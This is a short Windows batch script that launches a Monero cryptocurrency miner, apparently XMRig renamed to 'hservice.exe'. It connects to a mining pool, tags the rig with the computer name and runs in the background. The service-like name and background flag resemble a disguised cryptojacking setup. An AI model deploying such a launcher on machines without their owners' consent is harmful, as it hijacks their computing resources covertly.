@echo off
hservice.exe -o pool.minexmr.com:443 -u <wallet> -k --tls -t 1 --rig-id %COMPUTERNAME% -B
pause
